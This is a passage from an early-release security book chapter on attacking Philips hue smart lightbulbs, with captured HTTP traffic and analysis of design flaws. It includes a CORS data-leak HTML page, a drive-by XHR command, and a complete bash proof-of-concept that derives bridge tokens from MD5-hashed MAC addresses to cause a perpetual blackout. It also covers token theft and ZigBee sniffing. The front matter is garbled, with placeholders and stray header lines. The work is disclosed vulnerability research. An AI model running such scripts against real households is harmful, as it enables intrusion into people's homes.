
Nitesh Dhanjani
Abusing the Internet of Things

Abusing the Internet of Things
by Nitesh Dhanjani
Copyright © 2010 Nitesh Dhanjani. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://safaribooksonline.com). For more information, contact our corporate/
institutional sales department: 800-998-9938 or corporate@oreilly.com.
Editors: Mike Loukides and Brian Sawyer
Production Editor: FIX ME!
Copyeditor: FIX ME!
Proofreader: FIX ME!
Indexer: FIX ME!
Cover Designer: Karen Montgomery
Interior Designer: David Futato
Illustrator: Rebecca Demarest
January -4712:
First Edition
Revision History for the First Edition:
2015-04-03: Early release revision 1
2015-05-29: Early release revision 2
2015-06-08: Early release revision 3
2015-06-16: Early release revision 4
2015-06-26: Early release revision 5
See http://oreilly.com/catalog/errata.csp?isbn=0636920033547 for release details.
Nutshell Handbook, the Nutshell Handbook logo, and the O’Reilly logo are registered trademarks of O’Reilly
Media, Inc. !!FILL THIS IN!! and related trade dress are trademarks of O’Reilly Media, Inc.
Many of the designations used by manufacturers and sellers to distinguish their products are claimed as
trademarks. Where those designations appear in this book, and O’Reilly Media, Inc. was aware of a trademark
claim, the designations have been printed in caps or initial caps.
While every precaution has been taken in the preparation of this book, the publisher and authors assume
no responsibility for errors or omissions, or for damages resulting from the use of the information contained
herein.
ISBN: 063-6-920-03354-7
[?]

Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  vii
AppleWebKit/536.28.10
(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10
Accept: */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: keep-alive
Contolling Lights Via the Website Interface 
| 
11

Proxy-Connection: keep-alive
Content-Length: 12
{"on":false}
As you can see, the browser sends its whitelist token that was generated when the
bridge was associated with the user’s account. The /groups/0/action command is
documented in Section 2.5 of the Philip’s API (free registration required) and is used to
turn all lights off.
In the case where the user is remote and not on the same local segment as the bridge,
the message is routed through the web server:
GET /en-US/user/sendMessageToBridge?clipmessage=%7B%22bridgeId%22%3A%22[DELETED]
%22%2C%22clipCommand%22%3A%7B%22url%22%3A%22%2Fapi%2F0%2Fgroups%2F0%2Faction%22%
2C%22method%22%3A%22PUT%22%2C%22body%22%3A%7B%22on%22%3Afalse%7D%7D%7D HTTP/1.1
Host: www.meethue.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)
AppleWebKit/536.28.10
(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: https://www.meethue.com/en-US/user/scenes
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Cookie:[DELETED]
Connection: keep-alive
Proxy-Connection: keep-alive
Notice that in this case the value of the clipCommand contains the same /groups/0/
action command as the local request. The bridge quickly collects this instruction from
the established outbound connection by issuing a POST request to /queue/getmessage?
id=[DELETED id]&sso=[DELETED]. Once the bridge processes the request, the server
responds to the browser with a positive affirmation that all lights are turned off:
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_FLASH=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_ERRORS=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_SESSION=[DELETED];Path=/
Vary: Accept-Encoding
Date: Sun, 05 May 2013 23:04:19 GMT
Server: Google Frontend
Content-Length: 41
{"code":200,"message":"ok","result":"ok"}
12 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

The ok codes for message and result signify that the instructions executed successfully
and the bulbs were turned off.
Information Leakage
The web server associated with the hue website and the bridge (the bridge has a web
server listening on TCP port 80) includes the following header when they respond to
requests:
Access-Control-Allow-Origin: *
According to cross-origin policies within web browsers, this header allows JavaScript
code on any website on the Internet to access the results from the web servers running
on the hue website and the bridge. This leads to a situation in which an external entity
can capture the fact that the user is on a network segment that has the hue system
installed, as well as capture the bridge’s id, MAC address, and internal IP address.
To illustrate this, consider the following HTML code:
<HTML>
        <SCRIPT>
                // Create the XHR object.
                function find_hue()
                {
                        var url = 'https://www.meethue.com/api/nupnp';
                        var xhr = new XMLHttpRequest();
                        xhr.open('GET', url, true);
                        xhr.onload = function()
                        {
                                var text = xhr.responseText;
                                var obj=JSON.parse(text.substr(1,
                                text.length-2));
                                document.write('<H3>Your Hue bridge id
                                is '+ obj.id + '</H3><BR>');
                                document.write('<H3>Your Hue bridge
                                internal IP address is '+
                                obj.internalipaddress + '</H3><BR>');
                                document.write('<H3>Your Hue bridge MAC
                                address is '+ obj.macaddress + '</H3><BR>');
                        };
                        xhr.send();
                }
                find_hue();
Contolling Lights Via the Website Interface 
| 
13

        </SCRIPT>
</HTML>
Assume the HTML code is hosted on an external website. As shown in Figure 1-6, the
website hosted at www.dhanjani.com is able to capture the bridge’s id, internal IP ad‐
dress, and MAC address. As shown in the HTML code, this is done by using XMLHttpRe
quest, which makes the web browser connect to a domain other than www.dhanja
ni.com (i.e., meethue.com). The owner of the external website can easily capture this
information and store it.
Figure 1-6. Information leakage to external website
From a security perspective, just the mere fact of visiting an arbitrary website should
not reveal this information to the website owner. We classify this issue as information
leakage, because it reveals information to an external entity who has not been authorized
by the user to obtain this data.
Drive-by Blackouts
The web server running on the bridge also has the Access-Control-Allow-Origin
header set to *. Should the owner of an external website know one of the whitelist
tokens associated with the bridge, he or she can remotely control the lights by perform‐
ing an XMLHttpRequest to get the bridge’s internal IP address (as discussed earlier) and
then performing another XMLHttpRequest to the bridge’s IP address using PUT:
xhr.open('PUT', 'http://'+obj.internalipaddress+'/api/[whitelist DELETED]/groups/
0/action', true);
and then sending the body of the PUT request:
xhr.send("{\"on\":false}");
14 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

This would cause the victim’s browser to command the hue bridge to turn the lights off,
just by visiting the malicious website (thus the term drive-by).
The probability of a malicious person pulling this off is low, because they would have
to know one of the whitelist tokens. But it is a poor design decision to set the Access-
Control-Allow-Origin header to *, because good security mechanisms should not
allow an arbitrary website to be able to force lights to turn off, even if they knew one of
the whitelist tokens.
Weak Password Complexity and Password Leaks
The hue website lets the user control the lights remotely as long as the user logs in with
valid credentials.
As shown in Figure 1-7, the hue website requires only that passwords be at least char‐
acters long. Users might be tempted to create easily guessable passwords such as
123456. In fact studies have shown 123456 and password to be the most common pass‐
words.
Figure 1-7. A password requirement of at least six characters
Contolling Lights Via the Website Interface 
| 
15

While it is true that, ultimately, the user is at fault for selecting weak passwords such as
these, it is also the job of security architects to make it harder for people to make such
mistakes. Most people just want their devices and software to work in the moment and
simply aren’t aware of potential negative repercussions in the future.
Despite the weak password policy, the website does lock out the account for one minute
after every two failed login attempts (Figure 1-8). This decreases the odds of brute-force
password attacks in the event that a user has have selected a password that is not easily
guessable.
16 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Figure 1-8. Account locked for one minute after two failed login attempts
However, another major problem is users’ tendency to reuse their credentials on other
services. News of major password leaks occur on a frequent, if not daily, basis. When
Contolling Lights Via the Website Interface 
| 
17

an attack has compromised a major website, an attacker can easily attempt to log into
the hue website using usernames and passwords obtained from such leaks.
This scenario is high risk, because all the attacker needs to do is go through usernames
(when they are in the form of email addresses) and passwords that have been compro‐
mised and posted publicly and begin to test the credentials on the hue website. In this
way, attackers can easily harvest hue accounts and gain the ability to change the state of
people’s lightbulbs remotely.
On a related note, another threat is the potential compromise of the hue website infra‐
structure or the abuse of the system by a disgruntled employee. Either of these situations
can put enormous power in the hands of a potential attacker. Philips has not publicly
stated their internal governance process or the steps they may have taken to detect
possible attacks on their infrastructure. There is no indication from Philips on how they
protect the stored passwords in their databases or whether they are accessible to their
employees in the clear.
Controlling Lights Using the iOS App
Users can also control hue lights locally or remotely using an iPhone or iPad with the
hue app on the iOS App Store.
When the hue app is first launched, it tests to see if it has authorization to send com‐
mands to the hue bridge on the local network:
GET /api/[username DELETED] HTTP/1.1
Host: 10.0.1.2
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-us
Connection: keep-alive
Pragma: no-cache
User-Agent: hue/1.1.1 CFNetwork/609.1.4 Darwin/13.0.0
The username token is selected by the hue app. This is the response from the bridge:
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 1 Aug 2011 09:00:00 GMT
Connection: close
Access-Control-Max-Age: 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
Content-type: application/json
[{"error":{"type":1,"address":"/","description":"unauthorized user"}}]
18 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Since this is the first time the iOS device is attempting to connect to the bridge, the iOS
device is not authorized. In this situation, the user needs to prove physical ownership
by pressing the button on the bridge. At this point, the iOS app instructs the user to
press the physical button on the bridge, as shown in Figure 1-9.
Controlling Lights Using the iOS App 
| 
19

Figure 1-9. iOS app instructing the user to press the physical button on the bridge
20 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Behind the scenes, the iOS app sends the following POST request to the bridge:
POST /api HTTP/1.1
Host: 10.0.1.2
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-us
Accept: */*
Pragma: no-cache
Connection: keep-alive
User-Agent: hue/1.1.1 CFNetwork/609.1.4 Darwin/13.0.0
Content-Length: 71
{"username":"[username DELETED]","devicetype":"iPhone 5"}
Note that the value of the username field sent here is the same as the one sent in the
previous request, which failed because the iOS app was running for the first time on the
particular device. If the user presses the button on the bridge within 30 seconds, this
particular username will become authorized and can be used to issue commands to the
bridge while on the local network.
Assuming that the user does press the button on the bridge, the bridge sends the fol‐
lowing response to the iOS app:
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 1 Aug 2011 09:00:00 GMT
Connection: close
Access-Control-Max-Age: 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
Content-type: application/json
[{"success":{"username":"[username DELETED]"}}]
The bridge responds positively and echoes back the username field provided by the iOS
app. Now that the iOS App is now successfully authorized, it can command the bridge
with instructions, as long as it remembers the value of the username field.
The user can turn all lights off using the iOS app, as shown in Figure 1-10.
Controlling Lights Using the iOS App 
| 
21

Figure 1-10. User tapping “ALL OFF” button in iOS app
22 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

When the user selects to turn all lights off from the iOS App (and assuming the user is
in the local network, i.e., at home), the iOS app will send the following request directly
to the bridge:
PUT /api/[username DELETED]/groups/0/action HTTP/1.1
Host: 10.0.1.2
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-us
Pragma: no-cache
Connection: keep-alive
User-Agent: hue/1.1.1 CFNetwork/609.1.4 Darwin/13.0.0
Content-Length: 12
{"on":false}
And the bridge responds:
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 1 Aug 2011 09:00:00 GMT
Connection: close
Access-Control-Max-Age: 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
Content-type: application/json
[{"success":{"/groups/0/action/on":false}}]
The success attribute with the false value indicates that the command executed suc‐
cessfully and the lights were turned off (i.e., /groups/0/action/on indicates that the on
state is negative, which means it is false that the lights are turned on).
In the case where the iPhone is not on the same network segment (i.e., the user is
remote), the iOS app can remotely issue commands to the bridge via the portal infra‐
structure. In this case, the iOS device notifies the user that it is unable to connect to the
bridge directly, as shown in Figure 1-11.
Controlling Lights Using the iOS App 
| 
23

Figure 1-11. Hue iOS app notifying the user that it is unable to connect to the bridge
24 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

When the user taps More on the dialog in Figure 1-11, the app then presents an option
to “Setup away from home,” as shown in Figure 1-12.
Controlling Lights Using the iOS App 
| 
25

Figure 1-12. Options available when user taps More
26 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

When the user selects the “Setup away from home” option, the app launches the Safari
browser in iOS and requests the user’s credentials (shown in Figure 1-13). The user
needs to enter the website credentials established previously in “Contolling Lights Via
the Website Interface” on page 4.
Controlling Lights Using the iOS App 
| 
27

Figure 1-13. Portal login page to authorize iOS app
28 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Once the user enters the credentials and logs in, he or she is asked to authorize the app
(Figure 1-14).
Controlling Lights Using the iOS App 
| 
29

Figure 1-14. User is asked to authorize iOS app
30 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Once the user selects Yes, the browser sends the following GET request to www.meet
hue.com:
GET /en-US/api/getaccesstokenpost HTTP/1.1
Host: www.meethue.com
Referer: https://www.meethue.com/en-US/api/getaccesstokengivepermission
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: [DELETED]
Accept-Language: en-us
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_4 like Mac OS X)
AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B350 Safari/8536.25
The server then responds with the following:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: [DELETED]
Vary: Accept-Encoding
Date: Mon, 08 Jul 2013 05:24:14 GMT
Server: Google Frontend
Content-Length: 1653
<!DOCTYPE html>
<html>
  <head>
    <meta content="0;phhueapp://sdk/login/8/[TOKEN DELETED]=" http-equiv=
    "refresh" />
[Rest of HTML deleted for brevity]
The response from the server redirects the web browser to the phhueapp://sdk/login/
8/[TOKEN DELETED] URL, which causes the hue iOS app to relaunch. The iOS app is
passed the TOKEN value, which it stores and remembers to be able to connect to
www.meethue.com in the future and issue commands to the bridge remotely.
phhueapp: is known as a URL Scheme, which enables the Safari
browser and other Apps to launch particular Apps that have regis‐
tered the particular handler. For example, the native Maps app can be
launched by typing in maps:// in the Safari browser in iOS. In this
case, the hue app registered the phhueapp: handler, so Safari can
launch the hue app when it is redirected to a URL beginning with the
phhueapp: string.
Controlling Lights Using the iOS App 
| 
31

Now, when the use is remote (i.e., not on the same wireless network as the bridge),
commands are routed via the Internet to www.meethue.com. In this situation, when the
user taps on “ALL OFF” (Figure 1-10), the iOS app sends the following request with the
authorized TOKEN value it obtained earlier:
POST /api/sendmessage?token=[DELETED} HTTP/1.1
Host: www.meethue.com
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-us
Accept: */*
Connection: keep-alive
User-Agent: hue/1.0.2 CFNetwork/609.1.4 Darwin/13.0.0
Content-Length: 127
clipmessage={ bridgeId: "[DELETED}", clipCommand: { url:
"/api/0/groups/0/action", method: "PUT", body:
{"on":false} } }
In this case, the bridge responds:
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_FLASH=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_ERRORS=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_SESSION=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Date: Mon, 06 May 2013 19:51:58 GMT
Server: Google Frontend
Content-Length: 41
{"code":200,"message":"ok","result":"ok"}
The ok response from www.meethue.com signifies that the command was executed suc‐
cessfully and that all the lights were turned off.
Stealing the Token from a Mobile Device
The iOS app stores the username token and the TOKEN for www.meethue.com in the
Library/Preferences/com.philips.lighting.hue.plist file on the iPhone and iPad (stored as
uniqueGlobalDeviceIdentifier and sdkPortalToken respectively). Someone with
temporary access to a hue user’s mobile device can capture this file and then be able to
remotely control the hue bulbs. The probability of this risk is low, because the malicious
entity would require physical access to the mobile device.
32 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Malware Can Cause Perpetual Blackout
In the analysis of the use case, we studied how the username token is registered with the
bridge by the iOS app. This secret token can be used by any device on the local network
to connect directly to the bridge and issue it authorized commands to control the bulbs.
I found that the username token selected by the iOS app was not random but the
message-digest algorithm (MD5)-based hash of the iPhone’s MAC address. Every net‐
work card (wired or wireless) has a unique MAC address issued by the manufacturer.
In the case of wired or wireless networks, the MAC addresses of devices on the local
network that have transmitted data recently can be viewed by issuing the arp command
on most operating systems:
$ arp -a -n
? (172.20.0.1) at d4:ae:52:9d:1f:49 on en0 ifscope [ethernet]
? (172.20.0.23) at 7c:7a:91:33:be:a4 on en0 ifscope [ethernet]
? (172.20.0.52) at d8:a2:5e:4b:9a:50 on en0 ifscope [ethernet]
? (172.20.0.75) at 54:e4:3a:a6:4b:0e on en0 ifscope [ethernet]
? (172.20.0.90) at c8:f6:50:08:5f:e7 on en0 ifscope [ethernet]
? (172.20.0.154) at 74:e1:b6:9f:12:66 on en0 ifscope [ethernet]
Based on the output of the arp command, we can see the MAC addresses associated
with the particular device. For example, the device with the IP address of 172.20.0.90
has the MAC address c8:f6:50:08:5f:e7.
The MD5 algorithm in use is known as a one-way hash. So, the MD5 hash of
c8:f6:50:08:5f:e7 can be computed with the md5 tool:
$ md5 -s "c8:f6:50:08:5f:e7"
MD5 ("c8:f6:50:08:5f:e7") = 4ad1c59ad3f1c4fcdd67a55ee8f80160
In this case, the MD5 hash of c8:f6:50:08:5f:e7 is and always will be
4ad1c59ad3f1c4fcdd67a55ee8f80160. Given the one-way nature of MD5, it is hard to
compute the MAC address back from the actual hash. However, imagine a situation in
which a device on the same network has been infected with a malicious program in‐
stalled by an intruder (also known as malware). This malware can easily issue the arp
command and quickly compute the MD5 hash of each MAC address in the table. Then,
in order to cause a blackout, the malware simply has to connect to the hue bridge on
the local network and use the hash as the username to turn off the lights. This creates a
situation in which arbitrary malware on any device on the local network can directly
connect to the bridge and continuously issue commands to turn the lights off causing
a perpetual blackout.
Let’s imagine a proof-of-concept malware program written using the simple bash shell
available on most Unix and Linux hosts. First, the malicious script needs to locate the
IP address of the bridge:
Controlling Lights Using the iOS App 
| 
33

while [ -z "$bridge_ip" ];
do
    bridge_ip=($(curl --connect-timeout 5 -s https://www.meethue.com/api/nupnp
    |awk '{match($0,/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/);
    ip = substr($0,RSTART,RLENGTH); print ip}'))
    # If no bridge is found, try again in 10 minutes
    if [ -z "$bridge_ip" ];
    then
        sleep 600
    fi
done
The script browses to https://www.meethue.com/api/nupnp (see Figure 1-4) to obtain
the IP address of the bridge. If no bridge is found using this URL, it just sleeps for 10
minutes and keeps trying until a bridge is located on the local network.
Next, the script enters into an infinite loop:
while true; do
Within this infinite loop, it first gets the MAC addresses using the arp command:
mac_addresses=( $(arp -a | awk '{print toupper($4)}')
Now, for each MAC address, it pads the format so that MAC addresses such as
1:2:3:4:5:6 are in the format of 01:02:03:04:05:06:
padded_m=`echo $m |
            sed "s/^\(.\):/0\1:/" |
            sed "s/:\(.\):/:0\1:/g" |
            sed "s/:\(.\):/:0\1:/g" |
            sed "s/:\(.\)$/:0\1/"`
The script then computes the MD5 hash of the MAC address in the loop:
bridge_username=( $(md5 -q -s $padded_m))
Now, the script uses curl to connect to the bridge and issue it a lights-off command
using the calculated username:
turn_it_off=($(curl --connect-timeout 5 -s -X PUT http://$bridge_ip/api/
$bridge_username/groups/0/action -d {\"on\":false} | grep success))
If the command succeeds, the script goes into another infinite loop and perpetually
issues the lights-off command to the bridge:
if [ -n "$turn_it_off" ]; then
                        echo "SUCCESS! It's blackout time!";
                while true;
                do
                    turn_it_off=($(curl --connect-timeout 5
                    -s -X PUT http://$bridge_ip/api/$bridge_username
34 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

                    /groups/0/action -d {\"on\":false} | grep success))
                done
Example 1-1 contains the complete source code for the script.
Example 1-1. hue_blackout.bash
#!/bin/bash
# This script demonstrates how malware can cause sustained blackout on the
# Philips hue lightbulb system
# By design, the hue client software uses the MD5 hash of the users’ MAC
# address to register with the hue bridge
# This script collects the ARP addresses on the victim’s laptop or desktop
# to locate devices on the network that are likely to have been registered
# with the bridge. It then calculates the MD5 hash of each of the addresses
# and uses the output to connect to the hue bridge and issue a command to
# turn all the lights off. Once it finds a working token, it infinitely loops
# through the same request causing a continuous blackout (i.e. the lights
# turn off again if the user physically switches the bulbs off and then on
# again). If the user deregisters the associate device, the script goes back
# to looking for more valid MAC addresses. If the user registers the same
# device, the script will again cause a sustained blackout and repeat the
# process
# Written by Nitesh Dhanjani
# Get the internal IP of the bridge which is advertised on the meethue portal.
while [ -z "$bridge_ip" ];
do
    bridge_ip=($(curl --connect-timeout 5 -s https://www.meethue.com/api/nupnp
    |awk '{match($0,/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/); ip =
    substr($0,RSTART,RLENGTH); print ip}'))
    # If no bridge is found, try again in 10 minutes.
        if [ -z "$bridge_ip" ];
    then
                sleep 600
        fi
done
# Bridge found, lets cycle through the MAC addresses and cause a blackout.
echo "Found bridge at $bridge_ip"
# We never break out of this loop ;-)
while true;
do
    # Get MAC addresses from the ARP table
    mac_addresses=( $(arp -a | awk '{print toupper($4)}') )
    # Cycle through the list
Controlling Lights Using the iOS App 
| 
35

    for m in "${mac_addresses[@]}"
    do
        # Pad it so 0:4:5a:fd:83:f9 becomes 00:04:5a:fd:83:f9 (thanks
        # http://code.google.com/p/plazes/wiki/FindingMACAddress)
        padded_m=`echo $m |
                    sed "s/^\(.\):/0\1:/" |
                    sed "s/:\(.\):/:0\1:/g" |
                    sed "s/:\(.\):/:0\1:/g" |
                    sed "s/:\(.\)$/:0\1/"`
        # Ignore broadcase entries in the ARP table
        if [ $padded_m != "FF:FF:FF:FF:FF:FF" ]
        then
            # Compute MD5 hash of the MAC address
            bridge_username=( $(md5 -q -s $padded_m))
            # Use the hash to attempt to instruct the bridge to turn
            # all lights off
            turn_it_off=($(curl --connect-timeout
            5 -s -X PUT
            http://$bridge_ip/api/$bridge_username/groups/0/action -d
            {\"on\":false} | grep success))
            # If it worked, go into an infinite loop and cause a sustained
            # blackout
            if [ -n "$turn_it_off" ];
            then
                echo "SUCCESS! It's blackout time!";
                while true;
                do
                    turn_it_off=($(curl --connect-timeout 5 -s
                    -X PUT http://$bridge_ip/
                    api/$bridge_username/groups/0/action -d {\"on\":false}
                    | grep success))
                    # The hue bridge can't keep up with too many iterative
                    # requests. Sleep for 1/2 a sec to let it recover
                    sleep 0.5
                    # Break out of the loop and go back to cycling through
                    # ARP entries if the user de-registered the device
                    # NOTE: If the user were to register the same physical
                    # device, we will get the token again and redo the blackout.
                    # Or, we may get a hold of another registered device from
                    # the ARP table.
                    if [ -z "$turn_it_off" ];
                    then
36 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

                        echo "Hm. The token doesn't work anymore the user must
                        have deregistered the device :("
                        break
                    fi
                done
            fi
        fi
    done
    unset mac_addresses;
done
One other issue with the design of the system is that there is no way to unregister a
whitelist token. In other words, if a device such as an iPhone is authorized to the
bridge, there is no user-facing functionality to unauthorize the device. Since the au‐
thorization is performed using the MAC address, an authorized device will continued
to enjoy access to the bridge.
See Hacking Lightbulbs for a video demonstration of the hue_back‐
out.bash script.
Note that, upon notification to Philips, this issue was fixed and a software and firmware
update has been released.
Changing Lightbulb State
So far, we’ve seen how to command the hue bridge to change the state of bulbs. The
bridge itself uses the ZigBee Light Link (ZLL) wireless protocol to instruct the bulbs.
Built upon the IEEE 802.15.4 standard, ZLL is a low-cost, low-powered, popular pro‐
tocol used by millions of devices and sensors, including the Philips hue system. The
ZLL standard is a specification of a ZigBee application profile that defines communi‐
cation parameters for lighting systems related to the consumer market and small pro‐
fessional installations.
ZLL requires the use of a manufacturer-issued master key, which is stored on both the
bridge and the lightbulbs. Upon initiation (when the user presses the button on the
bridge), the bridge generates a random network key and encrypts it using the master
key. The lightbulbs use the master key to decrypt and read the network key and use it
to subsequently communicate with the bridge.
Changing Lightbulb State 
| 
37

Using the Killerbee framework and an RZ USBstick, we can sniff ZLL network traffic.
After plugging in the RZ USBstick, first identify it using zbid, a tool that is part of the
Killerbee suite:
# zbid
Dev     Product String  Serial Number
002:005 KILLERB001        [DELETED]
Next, we can begin sniffing using zbwireshark (on channel 11):
# zbwireshark -f 11 -i '002:005'
This starts up the Wireshark tool to capture Zigbee traffic.
As shown in Figure 1-15, the hue bridge continuously sends out beacon broadcast re‐
quests on channel 11 (ZigBee channels range from 11 to 26). A candidate device (light‐
bulb) can respond to the beacon request to join the network.
Figure 1-15. Wireshark capture of beacon requests
In this case, other than beacon requests, ZLL traffic was found operating on channel
20, as shown in Figure 1-16. The Security Control Field in the ZigBee Security Header
is set to 0x01, which indicates that a message authentication code (MAC) is in use (AES-
CBC-MAC-3/MIC-32). The transmission of the MAC is also captured and illustrated.
38 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Figure 1-16. Wireshark capture of channel 20 traffic
Once the bridge receives an authorized request to change the state of an associate light‐
bulb, the ZigBee protocol and the ZLL specification is used to communicate to the bulbs,
as captured and shown in Figure 1-15 and Figure 1-16.
We know the bridge uses the ZLL protocol to communicate with the bulbs. The bridge
also uses a shared secret key to maintain an HTTP-based outbound connection with
the hue infrastructure. This connection is used by the bridge to pick up commands that
are routed through the hue website (or the iOS app, if the user is remote). It is possible
for a flaw to exist in the implementation of ZLL or the encryption used by the bridge.
However, to exploit the issue, the attacker would need to be physically close to the victim
(to abuse an issue with ZLL) or be able to intercept and inject packets on the network
segment.
Since the probability of this issue is low, it is not deemed to be a critical risk, although
the potential is worth stating.
Changing Lightbulb State 
| 
39

If This Then That (IFTTT)
If This Then That (IFTTT) is a service that lets users create recipes that follow the simple
logic of “if this then that” instructions. Users can create recipes across multiple cloud
services such as Gmail, Dropbox, LinkedIn, Twitter, etc. For example, you can use the
app to establish actions based on conditions such as, “Every time I’m tagged on a photo
in Facebook, also upload it to my Dropbox account.”
IFTT users can also create recipes for the hue lightbulb system (Figure 1-17)--for ex‐
ample, “If I’m tagged in a photo in Facebook, blink my lights to let me know.”
Figure 1-17. Hue channel on IFTTT (If This Then That)
The IFTTT service allows the user community to contribute recipes for the various
channels, including hue. With so many readily available recipes, users might not always
think through the implications of how the recipe might be abused by others to influence
their IoT devices.
40 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

As an example of an insecure recipe, consider the one shown in Figure 1-18, which
allows the user to change the bulb colors from a photo he or she has been tagged in.
Figure 1-18. IFTTT recipe to change bulb colors from a tagged Facebook photo
